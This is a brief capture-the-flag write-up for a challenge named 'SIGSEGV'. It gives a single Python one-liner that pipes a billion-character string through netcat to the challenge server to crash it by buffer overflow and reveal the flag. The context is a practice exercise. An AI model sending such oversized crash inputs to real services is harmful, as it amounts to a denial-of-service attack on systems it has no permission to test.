# SIGSEGV

### Prerequires:

- Nothing

-----------------

- With the name of the challenge we know we have to do a Buffer Overflow, then I use print in py:

`python3 -c "print('a'*1000000000)" | nc challenges.0x0539.net 7071`

- And the flag will appear
